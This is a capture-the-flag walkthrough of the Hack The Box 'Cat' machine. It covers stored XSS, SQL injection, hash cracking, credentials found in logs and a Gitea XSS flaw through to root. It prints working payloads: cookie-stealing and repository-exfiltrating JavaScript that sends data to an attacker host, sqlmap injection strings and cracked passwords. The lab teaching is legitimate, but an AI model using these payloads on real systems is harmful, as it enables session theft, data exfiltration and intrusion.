---
icon: paw
---

# HTB-CAT

<figure><img src="../../../../.gitbook/assets/image (329).png" alt=""><figcaption></figcaption></figure>

#### **Attack Flow Explanation**

**1. Initial Access**

1. **Cat Competition Webpage** – The target hosted a web application for a cat competition.
2. **Exposed `.git` Repository** – The `.git` directory was publicly accessible, allowing the attacker to download the website’s full source code.
3. **XSS in Username Field** – During cat registration, the username field was vulnerable to **stored XSS**, which was used to **steal session cookies**.
4. **SQL Injection** – Using the stolen cookie, the attacker performed SQL injection to dump sensitive data.
5. **Password Hashes Extracted** – SQLi allowed retrieval of password hashes from the database.
6. **Brute Force Attack** – Password hashes were cracked, granting shell access as **rosa**.

**2. Privilege Escalation**

7. **adm Group Membership + Password in Logs** – Rosa was in the `adm` group and could read logs, which contained plaintext credentials for **axel**.
8. **Port Forwarding** – From axel’s account, port forwarding was done to access an **internal Gitea instance**.
9. **CVE-2024-6886 Exploit** – Exploited this Gitea vulnerability to commit a repository containing an **XSS payload**.
10. **Internal Phishing Attack** – The XSS payload was used in an internal phishing email to trigger **SSRF**.
11. **Access to Private Repository** – SSRF allowed access to a private repository containing **hardcoded credentials**.
12. **Root Access** – Using the credentials, the attacker obtained a shell as **root**.

***

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

<pre class="language-python"><code class="lang-python"><strong>Nmap scan report for 10.10.11.53
</strong>Host is up (0.066s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
|_  256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://cat.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</code></pre>

Before having a closer look at the web page on port `80` I do add `cat.htb` to my `/etc/hosts` file.

### Initial Access <a href="#initial-access" id="initial-access"></a>

<figure><img src="../../../../.gitbook/assets/image (330).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (331).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (332).png" alt=""><figcaption></figcaption></figure>

The page is the _ultimate platform to showcase your cat’s talent and beauty_, features three cats that recently won the award and allows me to register a new account. After logging into my account I can also register a new cat by providing some basic information and a picture but even after sending the form I don’t see my cat anywhere.

During the registration and login process I notice that the application does not use the usual **POST** requests but relies on **GET** to transfer the data. This means that all the credentials might show up in a log somewhere.

<figure><img src="../../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

With the help of **ffuf** I bruteforce directories and files on the server. Besides some pretty common hits it also finds a `.git` repository exposed on the page.

```python
sn0x㉿sn0x)-[~/hackthebox/CAT]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://cat.htb/FUZZ
 
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       
 
       v2.1.0-dev
________________________________________________
 
 :: Method           : GET
 :: URL              : http://cat.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
 
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 35ms]
.hta                    [Status: 403, Size: 272, Words: 20, Lines: 10, Duration: 35ms]
.git/config             [Status: 200, Size: 92, Words: 9, Lines: 6, Duration: 36ms]
.htaccess               [Status: 403, Size: 272, Words: 20, Lines: 10, Duration: 36ms]
.git                    [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 36ms]
.git/logs/              [Status: 403, Size: 272, Words: 20, Lines: 10, Duration: 37ms]
.git/index              [Status: 200, Size: 1726, Words: 10, Lines: 10, Duration: 38ms]
.htpasswd               [Status: 403, Size: 272, Words: 20, Lines: 10, Duration: 34ms]
admin.php               [Status: 302, Size: 1, Words: 1, Lines: 2, Duration: 34ms]
css                     [Status: 301, Size: 300, Words: 20, Lines: 10, Duration: 35ms]
img                     [Status: 301, Size: 300, Words: 20, Lines: 10, Duration: 18ms]
index.php               [Status: 200, Size: 3075, Words: 870, Lines: 130, Duration: 37ms]
server-status           [Status: 403, Size: 272, Words: 20, Lines: 10, Duration: 35ms]
uploads                 [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 32ms]
```

Next I run GIT-DUMPER to _clone_ the repository to my local machine for further inspection. The repo contains the source code of the web page and there’s just a single commit.

```python
sn0x㉿sn0x)-[~/hackthebox/CAT]
└─$ git-dumper http://cat.htb/.git cat.git
```

The `config.php` only reveals that there’s a **SQLite3** database and there are multiple references to user `axel` in the code. Looking at the code for the registration of new users it’s clear that there is no sanitization whatsoever. In case the username is displayed somewhere there’s a chance this can be leveraged as a stored cross-site scripting (XSS) vulnerability

join.php [#initial-access](htb-cat.md#initial-access "mention")

```python

// Registration process
if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['registerForm'])) {
    $username = $_GET['username'];
    $email = $_GET['email'];
    $password = md5($_GET['password']);
 
    $stmt_check = $pdo->prepare("SELECT * FROM users WHERE username = :username OR email = :email");
    $stmt_check->execute([':username' => $username, ':email' => $email]);
    $existing_user = $stmt_check->fetch(PDO::FETCH_ASSOC);
 
    if ($existing_user) {
        $error_message = "Error: Username or email already exists.";
    } else {
        $stmt_insert = $pdo->prepare("INSERT INTO users (username, email, password) VALUES (:username, :email, :password)");
        $stmt_insert->execute([':username' => $username, ':email' => $email, ':password' => $password]);
 
        if ($stmt_insert) {
            $success_message = "Registration successful!";
        } else {
            $error_message = "Error: Unable to register user.";
        }
    }
}

```

Going through the rest of the code I find a snippet where this happens. The `view_cat.php` is apparently used to show a cat and their owner. The data is pulled from the database and then displayed without escaping any special characters directly on the page.

view\_cat.php [#initial-access](htb-cat.md#initial-access "mention")

```python
<?php
// --- SNIP ---
 
// Get the cat_id from the URL
$cat_id = isset($_GET['cat_id']) ? $_GET['cat_id'] : null;
 
if ($cat_id) {
    // Prepare and execute the query
    $query = "SELECT cats.*, users.username FROM cats JOIN users ON cats.owner_username = users.username WHERE cat_id = :cat_id";
    $statement = $pdo->prepare($query);
    $statement->bindParam(':cat_id', $cat_id, PDO::PARAM_INT);
    $statement->execute();
 
    // Fetch cat data from the database
    $cat = $statement->fetch(PDO::FETCH_ASSOC);
 
    if (!$cat) {
        die("Cat not found.");
    }
} else {
    die("Invalid cat ID.");
}
?>
// --- SNIP _---_
<div class="container">
    <h1>Cat Details: <?php echo $cat['cat_name']; ?></h1>
    <img src="<?php echo $cat['photo_path']; ?>" alt="<?php echo $cat['cat_name']; ?>" class="cat-photo">
    <div class="cat-info">
        <strong>Name:</strong> <?php echo $cat['cat_name']; ?><br>
        <strong>Age:</strong> <?php echo $cat['age']; ?><br>
        <strong>Birthdate:</strong> <?php echo $cat['birthdate']; ?><br>
        <strong>Weight:</strong> <?php echo $cat['weight']; ?> kg<br>
        <strong>Owner:</strong> <?php echo $cat['username']; ?><br>
        <strong>Created At:</strong> <?php echo $cat['created_at']; ?>
    </div>
</div>
 
</body>
</html>


```

In order to exploit this I create another account with a very simple payload that adds a new `script` tag and loads some Javascript from my server. This way I don’t have to create a new account for every Javascript payload I want to send.

```python
<script src='http://10.10.10.10/xss.js'></script>
```

<figure><img src="../../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

Then I prepare the actual payload to be executed within the session of the presumably admin user. Considering the `HTTPOnly` flag for the cookie is **not** set, I can just exfiltrate the cookie by sending it via a `XMLHttpRequest`. After registering a new cat there’s a callback on my server to load the `xss.js` with the payload and then followed by a request with the cookie.

```python
sn0x㉿sn0x)-[~/hackthebox/CAT]
└─$ cat xss.jslet xhr = new XMLHttpRequest();xhr.open('GET', 'http://10.10.10.10/cookie?' + document.cookie, false);xhr.send() $ python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.129.43.40 - - [06/May/2025 17:52:57] "GET /xss.js HTTP/1.1" 200 -10.129.43.40 - - [06/May/2025 17:52:57] code 404, message File not found10.129.43.40 - - [06/May/2025 17:52:57] "GET /cookie?PHPSESSID=jkn1kvhipi4tot8f562vpoi3cm HTTP/1.1" 404 -
```

Replacing the cookie in my browser and refreshing the page shows another option in the navigation bar, but I was already able to infer that from the source code. The new privileges allow access to `accept_cat.php` and within its source code I can spot a **SQL injection**. Providing a `catName` and the `catId` in a **POST** request inserts the `catName` directly into a database query.

accept\_cat.php [#initial-access](htb-cat.md#initial-access "mention")

```python

<?php
include 'config.php';
session_start();
 
if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST['catId']) && isset($_POST['catName'])) {
            $cat_name = $_POST['catName'];
            $catId = $_POST['catId'];
            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
            $pdo->exec($sql_insert);
 
            $stmt_delete = $pdo->prepare("DELETE FROM cats WHERE cat_id = :cat_id");
            $stmt_delete->bindParam(':cat_id', $catId, PDO::PARAM_INT);
            $stmt_delete->execute();
 
            echo "The cat has been accepted and added successfully.";
        } else {
            echo "Error: Cat ID or Cat Name not provided.";
        }
    } else {
        header("Location: /");
        exit();
    }
} else {
    echo "Access denied.";
}
?>
 

```

Considering it’s a pretty simple injection I feed the necessary information to **sqlmap**, making sure to also include the cookie value otherwise the tool won’t be able to access the page. Just a few seconds pass and **sqlmap** identified two possible techniques.

```python
sn0x㉿sn0x)-[~/hackthebox/CAT]
└─$ sqlmap -X POST \
         -u 'http://cat.htb/accept_cat.php' \
         -H 'Cookie: PHPSESSID=jkn1kvhipi4tot8f562vpoi3cm'
         --data 'catId=1&catName=kitty' \
         --dbms=sqlite \
         --level 5 \
         --risk 3 \
         -p catName
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
 
[18:05:44] [INFO] testing connection to the target URL
[18:05:44] [INFO] testing if the target URL content is stable
[18:05:45] [INFO] target URL content is stable
[18:05:45] [WARNING] heuristic (basic) test shows that POST parameter 'catName' might not be injectable
[18:05:45] [INFO] testing for SQL injection on POST parameter 'catName'
[18:05:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:05:47] [INFO] POST parameter 'catName' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
[18:05:47] [INFO] testing 'Generic inline queries'
[18:05:47] [INFO] testing 'SQLite inline queries'
[18:05:47] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[18:05:47] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[18:05:47] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[18:05:52] [INFO] POST parameter 'catName' appears to be 'SQLite > 2.0 AND time-based blind (heavy query)' injectable
--- SNIP ---
---
Parameter: catName (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: catId=1&catName=kitty'||(SELECT CHAR(105,88,90,83) WHERE 6333=6333 AND 1481=1481)||'
 
    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: catId=1&catName=kitty'||(SELECT CHAR(104,78,97,116) WHERE 2202=2202 AND 9669=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))||'
---
[18:05:56] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: SQLite
```

Then I proceed to dump all the available tables even though I already know some of them from the source code. In total there are four with `users` being the most promising one. Dumping it reveals the email and password hashes of 11 users.

```python
sn0x㉿sn0x)-[~/hackthebox/CAT]
└─$ $ sqlmap -X POST \
         -u 'http://cat.htb/accept_cat.php' \
         -H 'Cookie: PHPSESSID=jkn1kvhipi4tot8f562vpoi3cm'
         --data 'catId=1&catName=kitty' \
         --dbms=sqlite \
         --level 5 \
         --risk 3 \
         -p catName \
         --tables
--- SNIP ---
 
[4 tables]
+-----------------+
| accepted_cats   |
| cats            |
| sqlite_sequence |
| users           |
+-----------------+
 
$ sqlmap -X POST \
         -u 'http://cat.htb/accept_cat.php' \
         -H 'Cookie: PHPSESSID=jkn1kvhipi4tot8f562vpoi3cm'
         --data 'catId=1&catName=kitty' \
         --dbms=sqlite \
         --level 5 \
         --risk 3 \
         -p catName \
         -T users \
         --dump \
         --threads 10
--- SNIP ---
 
[11 entries]
+---------+-------------------------------+----------------------------------+----------------------------------------------------+
| user_id | email                         | password                         | username                                           |
+---------+-------------------------------+----------------------------------+----------------------------------------------------+
| 1       | axel2017@gmail.com            | d1bbba3670feb9435c9841e46e60ee2f | axel                                               |
| 2       | rosamendoza485@gmail.com      | ac369922d560f17d6eeb8b2c7dec498c | rosa                                               |
| 3       | robertcervantes2000@gmail.com | 42846631708f69c00ec0c0a8aa4a92ad | robert                                             |
| 4       | fabiancarachure2323@gmail.com | 39e153e825c4a3d314a0dc7f7475ddbe | fabian                                             |
| 5       | jerrysonC343@gmail.com        | 781593e060f8d065cd7281c5ec5b4b86 | jerryson                                           |
| 6       | larryP5656@gmail.com          | 1b6dce240bbfbc0905a664ad199e18f8 | larry                                              |
| 7       | royer.royer2323@gmail.com     | c598f6b844a36fa7836fba0835f1f6   | royer                                              |
| 8       | peterCC456@gmail.com          | e41ccefa439fc454f7eadbf1f139ed8a | peter                                              |
| 9       | angel234g@gmail.com           | 24a8ec003ac2e1b3c5953a6f95f8f565 | angel                                              |
| 10      | jobert2020@gmail.com          | 88e4dceccd48820cf77b5cf6c08698ad | jobert                                             |
| 11      | sn0x@xss.js                  | 5d41402abc4b2a76b9719d911017c592 | <script src='http://10.10.10.10/xss.js'></script>  |
+---------+-------------------------------+----------------------------------+----------------------------------------------------+
```

One of the hashes from the database can be cracked with **hashcat** and the `rockyou.txt` password list. Using the credentials `rosa:soyunaprincesarosa` allows me to login via **SSH**.

```python
sn0x㉿sn0x)-[~/hackthebox/CAT]
└─$ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
--- SNIP ---
ac369922d560f17d6eeb8b2c7dec498c:soyunaprincesarosa
```

### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

#### Shell as axel [#privilege-escalation](htb-cat.md#privilege-escalation "mention") <a href="#shell-as-axel" id="shell-as-axel"></a>

After logging in as `rosa` I check the group memberships and spot that this account is part of the `adm` group. Members are allowed to read _most_ of the logs on the system<sup>1</sup>.

```python
sn0x㉿sn0x)-[~/hackthebox/CAT]
└─ id 
uid=1001(rosa) gid=1001(rosa) groups=1001(rosa),4(adm)
```

While creating accounts for the cat website I already noticed that credentials were passed in **GET** request so any user that logged into the application would be recorded in the **apache** access logs. Grepping for the value `loginUsername` in `/var/log/apache2/access.log` finds two of my accounts and `axel` with the password `aNdZwgC4tI9gnVXv_e3Q`.

```python
sn0x㉿sn0x)-[~/hackthebox/CAT]
└─$ grep -Po 'loginUsername[^ ]+' /var/log/apache2/access.log | sort -u
loginUsername=%3Cscript+src%3D%27http%3A%2F%2F10.10.10.10%2Fxss.js%27%3E%3C%2Fscript%3E&loginPassword=hello&loginForm=Login
loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login
loginUsername=sn0x&loginPassword=helloworld123&loginForm=Login
```

With those credentials I can login via **SSH** and get the first flag.

Shell as root [#privilege-escalation](htb-cat.md#privilege-escalation "mention")

\
Right at the login the system notifies me that this user has a mail waiting. Actually there are two emails coming from `rosa` in `/var/spool/mail/axel`.

```python
sn0x㉿sn0x)-[~/hackthebox/CAT]
└─$ ssh axel@cat.htb
axel@cat.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)
 
--- SNIP ---
 
You have mail.
Last login: Fri Jan 31 11:31:57 2025 from 10.10.14.69
```

One is about launching new services and sending the link to the repository to `jobert@localhost` and to make sure that a **clear description** is included in the repository.

The second email reveals an **employee management** system under development at `http://localhost:3000/administrator/Employee-management/` with important details in the `README.md`.

```python
From rosa@cat.htb  Sat Sep 28 04:51:50 2024
Return-Path: <rosa@cat.htb>
Received: from cat.htb (localhost [127.0.0.1])
        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S4pnXk001592
        for <axel@cat.htb>; Sat, 28 Sep 2024 04:51:50 GMT
Received: (from rosa@localhost)
        by cat.htb (8.15.2/8.15.2/Submit) id 48S4pnlT001591
        for axel@localhost; Sat, 28 Sep 2024 04:51:49 GMT
Date: Sat, 28 Sep 2024 04:51:49 GMT
From: rosa@cat.htb
Message-Id: <202409280451.48S4pnlT001591@cat.htb>
Subject: New cat services
 
Hi Axel,
 
We are planning to launch new cat-related web services, including a cat care website and other projects. Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check if it is a promising service that we can develop.
 
Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.
 
From rosa@cat.htb  Sat Sep 28 05:05:28 2024
Return-Path: <rosa@cat.htb>
Received: from cat.htb (localhost [127.0.0.1])
        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S55SRY002268
        for <axel@cat.htb>; Sat, 28 Sep 2024 05:05:28 GMT
Received: (from rosa@localhost)
        by cat.htb (8.15.2/8.15.2/Submit) id 48S55Sm0002267
        for axel@localhost; Sat, 28 Sep 2024 05:05:28 GMT
Date: Sat, 28 Sep 2024 05:05:28 GMT
From: rosa@cat.htb
Message-Id: <202409280505.48S55Sm0002267@cat.htb>
Subject: Employee management
 
We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.// Some code
```

In order to check out the repositories on **Gitea** I forward port `3000` via **SSH**. The credentials for `axel` also work on the web interface but do not really grant me any additional access and there are no public repositories. This is especially strange considering `rosa` wanted `axel` to check out the employee management system.

<figure><img src="../../../../.gitbook/assets/image (233).png" alt=""><figcaption></figcaption></figure>

In the corner of the page **Gitea** displays the version number `1.22.0`. Looking up known exploits for this version finds CVE-2024-6886, a stored XSS within the **description** field of a repository. This comes in handy since `jobert` will do a thorough look at every repository I send via mail and that account might be able to check out other repositories.

payload.html [#privilege-escalation](htb-cat.md#privilege-escalation "mention")

```python
<a href='javascript:(
    function () {
        var abc = document.createElement("script");
        abc.setAttribute("src","http://10.10.10.10/xss.js");
        document.head.appendChild(abc);
    }
)();'>xxx</a>

```

First I create a new repository and add a modified version of the PoC as description. Instead of an alert box, this payload will add a new `script` element to the page effectively loading the actual payload from my web server. Then I make sure to tick the box to initialize the repository with some files, otherwise no one but me can see the repository.

<figure><img src="../../../../.gitbook/assets/image (234).png" alt=""><figcaption></figcaption></figure>

Checking out the created repository there’s a link in the description field and clicking it results in a hit on my web server so the **Gitea** application is vulnerable.

Next I switch out the contents of the `xss.js` with a new payload that exfiltrates the whole `Employee-Management` repository by downloading a ZIP archive and pushing this to my **netcat** (`nc -lvnp 4444`) listener.

xss.js

```python

let xhr = new XMLHttpRequest();
xhr.open('GET', '/administrator/Employee-management/archive/main.zip', true);
xhr.responseType = 'arraybuffer';
xhr.send();
 
xhr.onload = function() {
    let buffer = xhr.response;
    let binary = new Uint8Array(buffer).reduce((data, byte) => data + String.fromCharCode(byte), '');
    let payload = btoa(binary);
 
    let exfil = new XMLHttpRequest();
    exfil.open('POST', 'http://10.10.10.10:4444/exfil');
    exfil.send(payload);
};
 
xhr.send();

```

With all those things setup, I send `jobert@localhost` an email with the link to my repository from the session on the target.

```python
sn0x㉿sn0x)-[~/hackthebox/CAT]
└─$ sendmail -t << EOF
To: jobert@localhost
Subject: Hello there
 
http://localhost:3000/axel/xss
EOF
```

It takes a few moments and then there’s a callback on my server retrieving the `xss.js` followed by a connection to my **netcat** listener. I remove the **POST** data from the beginning of the file and then use `base64 -d` to convert the data back to a ZIP file. Unzipping the archive creates multiple files in a new directory.

```python
sn0x㉿sn0x)-[~/hackthebox/CAT]
└─$ cat employee.b64 | base64 -d > repo.zip
base64: invalid input
 
sn0x㉿sn0x)-[~/hackthebox/CAT]
└─$ unzip repo.zip
Archive:  repo.zip
7fa272fd5c07320c932584e150717b4829a0d0b3
   creating: employee-management/
  inflating: employee-management/README.md  
  inflating: employee-management/chart.min.js  
  inflating: employee-management/dashboard.php  
  inflating: employee-management/index.php  
  inflating: employee-management/logout.php  
  inflating: employee-management/style.css
```

The `README` does not contain any useful information even though `axel`was supposed to check it out. The `index.php` on the other hand contains the credentials for the admin user

index.php [#privilege-escalation](htb-cat.md#privilege-escalation "mention")

```python

<?php
$valid_username = 'admin';
$valid_password = 'IKw75eR0MR7CMIxhH0';
 
if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) || 
    $_SERVER['PHP_AUTH_USER'] != $valid_username || $_SERVER['PHP_AUTH_PW'] != $valid_password) {
    
    header('WWW-Authenticate: Basic realm="Employee Management"');
    header('HTTP/1.0 401 Unauthorized');
    exit;
}
 
header('Location: dashboard.php');
exit;
?>

```

Trying the password `IKw75eR0MR7CMIxhH0` for the root account is successful and I get the final flag.

<figure><img src="../../../../.gitbook/assets/complete (13).gif" alt=""><figcaption></figcaption></figure>
